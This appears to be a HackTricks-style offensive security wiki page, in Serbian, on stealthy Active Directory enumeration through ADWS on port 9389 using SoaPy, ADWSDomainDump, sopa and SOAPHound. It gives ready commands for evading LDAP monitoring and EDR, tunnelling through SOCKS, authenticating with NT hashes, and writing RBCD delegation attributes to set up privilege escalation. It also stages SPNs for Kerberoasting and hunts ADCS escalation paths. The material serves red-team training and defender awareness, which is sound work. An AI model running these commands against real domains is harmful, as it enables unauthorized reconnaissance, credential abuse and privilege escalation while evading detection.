# Active Directory Web Services (ADWS) Enumeration & Stealth prikupljanje

{{#include ../../banners/hacktricks-training.md}}

## Šta je ADWS?

Active Directory Web Services (ADWS) je **podrazumevano omogućen na svakom Domain Controller-u od Windows Server 2008 R2** i osluškuje TCP port **9389**.  Uprkos nazivu, **HTTP se ne koristi**.  Umesto toga, servis izlaže podatke u LDAP stilu kroz stek vlasničkih .NET framing protokola:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran unutar ovih binarnih SOAP frame-ova i odvija se preko neuobičajenog porta, **enumeracija kroz ADWS ima mnogo manju verovatnoću da bude nadzirana, filtrirana ili prepoznata potpisom nego klasični LDAP/389 i 636 saobraćaj**.  Za operatere to znači:<sup>[[1]](#references)[[7]](#references)</sup>

* Stealthier recon – Blue team-ovi se često koncentrišu na LDAP upite.
* Slobodu za prikupljanje podataka sa **non-Windows hostova (Linux, macOS)** tunelovanjem 9389/TCP kroz SOCKS proxy.
* Iste podatke koje biste dobili putem LDAP-a (korisnici, grupe, ACL-ovi, schema itd.) i mogućnost izvršavanja **upisa** (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

ADWS interakcije se implementiraju preko WS-Enumeration-a: svaki upit počinje porukom `Enumerate` koja definiše LDAP filter/atribute i vraća GUID `EnumerationContext`, nakon čega sledi jedna ili više `Pull` poruka koje prosleđuju rezultate do prozora rezultata definisanog na serveru.<sup>[[7]](#references)</sup> Konteksti ističu nakon približno 30 minuta, pa alati moraju da listaju rezultate po stranicama ili da podele filtere (prefix upiti po CN-u) kako bi izbegli gubitak stanja.<sup>[[8]](#references)</sup> Kada tražite security descriptor-e, navedite `LDAP_SERVER_SD_FLAGS_OID` control kako biste izostavili SACL-ove; u suprotnom ADWS jednostavno uklanja atribut `nTSecurityDescriptor` iz svog SOAP odgovora.

> NAPOMENA: ADWS koriste i mnogi RSAT GUI/PowerShell alati, pa se saobraćaj može stopiti sa legitimnom administratorskom aktivnošću.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) je **potpuna reimplementacija ADWS protokol steka u čistom Python-u**.  On kreira NBFX/NBFSE/NNS/NMF frame-ove bajt po bajt, što omogućava prikupljanje podataka sa Unix-like sistema bez korišćenja .NET runtime-a.<sup>[[1]](#references)[[2]](#references)</sup>

### Ključne funkcije

* Podržava **proxying kroz SOCKS** (korisno iz C2 implant-a).
* Precizno podešavanje search filtera identičnih LDAP upitu `-q '(objectClass=user)'`.
* Opcione **write** operacije (`--set` / `--delete`).
* **BOFHound output mode** za direktan unos u BloodHound.<sup>[[3]](#references)</sup>
* `--parse` flag za formatiranje timestamp-ova / `userAccountControl` vrednosti kada je potrebna čitljivost za ljude.<sup>[[2]](#references)</sup>

### Flag-ovi za ciljano prikupljanje i write operacije

SoaPy dolazi sa pripremljenim switch-evima koji repliciraju najčešće LDAP hunting zadatke preko ADWS-a: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, kao i raw `--query` / `--filter` opcije za prilagođene pull-ove.  Uparite ih sa write primitivama kao što su `--rbcd <source>` (postavlja `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging za ciljano Kerberoasting) i `--asrep` (menja `DONT_REQ_PREAUTH` u `userAccountControl` vrednosti).<sup>[[2]](#references)</sup>

Primer ciljanog SPN hunt-a koji vraća samo `samAccountName` i `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Koristite isti host/credentials da odmah iskoristite nalaze: izlistajte RBCD-capable objekte pomoću `--rbcds`, a zatim primenite `--rbcd 'WEBSRV01$' --account 'FILE01$'` da pripremite Resource-Based Constrained Delegation lanac (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) za kompletan postupak zloupotrebe).

### Instalacija (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump preko ADWS (Linux/Windows)

* Fork alata `ldapdomaindump` koji LDAP upite zamenjuje ADWS pozivima preko TCP/9389 radi smanjenja broja LDAP-signature detekcija.
* Obavlja početnu proveru dostupnosti porta 9389, osim ako je prosleđen `--force` (preskače proveru ako su skeniranja portova bučna/blokirana).
* Testirano protiv Microsoft Defender for Endpoint i CrowdStrike Falcon, uz uspešan bypass naveden u README.<sup>[[4]](#references)</sup>

### Instalacija
```bash
pipx install .
```
### Upotreba
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipičan izlaz beleži proveru dostupnosti porta 9389, ADWS bind i početak/završetak dump-a:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - praktičan klijent za ADWS u Golang-u

Slično kao soapy, [sopa](https://github.com/Macmod/sopa) implementira ADWS protocol stack (MS-NNS + MC-NMF + SOAP) u Golang-u i izlaže command-line flags za izvršavanje ADWS poziva kao što su:<sup>[[5]](#references)</sup>

* **Pretraga i preuzimanje objekata** - `query` / `get`
* **Životni ciklus objekata** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Uređivanje atributa** - `attr [add|replace|delete]`
* **Upravljanje nalozima** - `set-password` / `change-password`
* i drugi, kao što su `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, itd.

### Istaknute funkcije mapiranja protokola

* LDAP-style pretrage se izvršavaju putem **WS-Enumeration** (`Enumerate` + `Pull`), uz projekciju atributa, kontrolu opsega (Base/OneLevel/Subtree) i paginaciju.
* Preuzimanje pojedinačnog objekta koristi **WS-Transfer** `Get`; izmene atributa koriste `Put`; brisanja koriste `Delete`.
* Ugrađeno kreiranje objekata koristi **WS-Transfer ResourceFactory**; custom objekti koriste **IMDA AddRequest** kojim upravljaju YAML templates.
* Operacije sa lozinkama su **MS-ADCAP** actions (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Neautentifikovano otkrivanje metapodataka (mex)

ADWS izlaže WS-MetadataExchange bez credentials, što je brz način za proveru izloženosti pre autentifikacije:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### DNS/DC otkrivanje i Kerberos targeting beleške

Sopa može da razreši DC-ove putem SRV-a ako je `--dc` izostavljen, a `--domain` naveden. Upite izvršava sledećim redosledom i koristi cilj sa najvišim prioritetom:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operativno, koristite resolver kojim upravlja DC da biste izbegli greške u segmentiranim okruženjima:

* Koristite `--dns <DC-IP>` da bi se **sva** SRV/PTR/forward pretraživanja obavljala preko DC DNS-a.
* Koristite `--dns-tcp` kada je UDP blokiran ili su SRV odgovori veliki.
* Ako je Kerberos omogućen, a `--dc` je IP adresa, sopa obavlja **obrnuto PTR** pretraživanje kako bi dobio FQDN za pravilno usmeravanje ka SPN/KDC-u. Ako se Kerberos ne koristi, PTR pretraživanje se ne obavlja.

Primer (IP + Kerberos, forsirani DNS preko DC-a):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opcije materijala za autentifikaciju

Pored lozinki u čistom tekstu, sopa podržava **NT hashes**, **Kerberos AES keys**, **ccache** i **PKINIT certificates** (PFX ili PEM) za ADWS auth. Kerberos se podrazumeva kada se koristi `--aes-key`, `-c` (ccache) ili opcije zasnovane na certificates.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Kreiranje prilagođenih objekata putem template-a

Za proizvoljne klase objekata, komanda `create custom` koristi YAML template koji se mapira na IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` i `rdn` definišu kontejner i relativni DN.
* `attributes[].name` podržava `cn` ili namespaced `addata:cn`.
* `attributes[].type` prihvata `string|int|bool|base64|hex` ili eksplicitni `xsd:*`.
* Nemojte uključivati `ad:relativeDistinguishedName` niti `ad:container-hierarchy-parent`; sopa ih automatski ubacuje.
* Vrednosti `hex` se konvertuju u `xsd:base64Binary`; koristite `value: ""` za postavljanje praznih stringova.

## SOAPHound – ADWS kolekcija velikog obima (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) je .NET collector koji sve LDAP interakcije zadržava unutar ADWS-a i generiše JSON kompatibilan sa BloodHound v4. Jednom kreira kompletnu keš memoriju za `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a zatim je ponovo koristi za `--bhdump`, `--certdump` (ADCS) ili `--dnsdump` (AD-integrated DNS) prolaze velikog obima, tako da samo približno 35 kritičnih atributa napušta DC. AutoSplit (`--autosplit --threshold <N>`) automatski deli upite prema prefiksu CN-a kako bi ostao ispod 30-minutnog timeout-a za EnumerationContext u velikim forest-ima.<sup>[[8]](#references)</sup>

Tipičan workflow na VM-u operatora pridruženom domenu:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Izvezeni JSON slotovi direktno u SharpHound/BloodHound workflows — pogledajte [BloodHound methodology](bloodhound.md) za ideje za downstream grafički prikaz. AutoSplit čini SOAPHound otpornim u šumama sa više miliona objekata, uz manji broj upita u poređenju sa snapshot-ovima u ADExplorer stilu.

## Stealth AD Collection Workflow

Sledeći workflow prikazuje kako da enumerišete **domain & ADCS objects** preko ADWS-a, konvertujete ih u BloodHound JSON i tražite attack paths zasnovane na sertifikatima — sve iz Linux-a:

1. **Tunelujte 9389/TCP** iz ciljne mreže do svoje mašine (npr. pomoću Chisel-a, Meterpreter-a, SSH dynamic port-forward-a itd.). Exportujte `export HTTPS_PROXY=socks5://127.0.0.1:1080` ili koristite SoaPy `--proxyHost/--proxyPort`.

2. **Prikupite objekat root domena:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Prikupite objekte povezane sa ADCS-om iz Configuration NC-a:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konvertujte u BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Otpremite ZIP** u BloodHound GUI i pokrenite cypher upite kao što je `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da biste otkrili putanje eskalacije privilegija putem sertifikata (ESC1, ESC8 itd.).

### Upisivanje `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombinujte ovo sa `s4u2proxy`/`Rubeus /getticket` za kompletan lanac **Resource-Based Constrained Delegation** (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Pregled alata

| Namena | Alat | Napomene |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, čitanje/upis |
| ADWS dump velikog obima | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, prvo koristi keš, BH/ADCS/DNS režimi |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konvertuje SoaPy/ldapsearch logove |
| Kompromitovanje sertifikata | [Certipy](https://github.com/ly4k/Certipy) | Može se proxovati kroz isti SOCKS |
| ADWS enumeration i izmene objekata | [sopa](https://github.com/Macmod/sopa) | Generički klijent za interfejs sa poznatim ADWS endpointima - omogućava enumeration, kreiranje objekata, izmene atributa i promene lozinki |

## References

- [1] [SpecterOps – Obavezno koristite SOAP(y) – vodič za operatere kroz stealthy AD prikupljanje pomoću ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – specifikacije MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy enumeration Active Directory okruženja kroz ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound alat za prikupljanje Active Directory podataka putem ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
